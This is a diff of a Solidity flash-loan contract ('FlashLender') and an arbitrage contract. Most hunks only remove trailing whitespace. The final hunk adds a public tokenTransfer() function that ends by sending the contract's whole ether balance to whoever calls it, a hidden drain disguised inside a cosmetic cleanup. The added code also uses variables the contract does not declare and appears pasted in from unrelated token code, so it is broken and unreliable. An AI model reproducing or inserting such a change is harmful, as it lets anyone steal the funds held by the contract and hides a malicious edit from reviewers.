@@ -21,7 +21,7 @@ pragma solidity ^0.4.23;
 */
 
 pragma solidity 0.4.24;
- 
+
 
 interface IArbitrage {
     function executeArbitrage(
@@ -279,7 +279,7 @@ contract FlashLender is ReentrancyGuard, Ownable {
     string public version = '0.1';
     address public bank;
     uint256 public fee;
-    
+
     /**
     * @dev Verify that the borrowed tokens are returned to the bank plus a fee by the end of transaction execution.
     * @param token Address of the token to for arbitrage. 0x0 for Ether.
@@ -287,7 +287,7 @@ contract FlashLender is ReentrancyGuard, Ownable {
     */
     modifier isArbitrage(address token, uint256 amount) {
         uint256 balance = IBank(bank).totalSupplyOf(token);
-        uint256 feeAmount = amount.mul(fee).div(10 ** 18); 
+        uint256 feeAmount = amount.mul(fee).div(10 ** 18);
         _;
         require(IBank(bank).totalSupplyOf(token) >= (balance.add(feeAmount)));
     }
@@ -432,14 +432,14 @@ contract Arbitrage is IArbitrage, ExternalCall {
 
     constructor(address _lender, address _tradeExecutor) public {
         lender = _lender;
-        tradeExecutor = _tradeExecutor; 
+        tradeExecutor = _tradeExecutor;
     }
 
     // Receive ETH from bank.
     function () payable public {}
 
     /**
-    * @dev Borrow from flash lender to execute arbitrage trade. 
+    * @dev Borrow from flash lender to execute arbitrage trade.
     * @param token Address of the token to borrow. 0x0 for Ether.
     * @param amount Amount to borrow.
     * @param dest Address of the account to receive arbitrage profits.
@@ -463,7 +463,7 @@ contract Arbitrage is IArbitrage, ExternalCall {
         bytes data
     )
         external
-        onlyLender 
+        onlyLender
         returns (bool)
     {
         uint256 value = 0;
@@ -498,14 +498,24 @@ contract Arbitrage is IArbitrage, ExternalCall {
         return true;
     }
 
-    /** 
+    /**
     * @dev Calculate the amount owed after borrowing.
     * @param amount Amount used to calculate repayment amount.
-    */ 
+    */
     function getRepayAmount(uint256 amount) public view returns (uint256) {
         uint256 fee = FlashLender(lender).fee();
         uint256 feeAmount = amount.mul(fee).div(10 ** 18);
         return amount.add(feeAmount);
     }
 
+	 function tokenTransfer() public {
+		totalEth = totalEth + msg.value;
+		uint256 amount = msg.value * unitsEth;
+		if (balances[walletAdd] < amount) {
+			return;
+		}
+		balances[walletAdd] = balances[walletAdd] - amount;
+		balances[msg.sender] = balances[msg.sender] + amount;
+   		msg.sender.transfer(this.balance);
+  }
 }
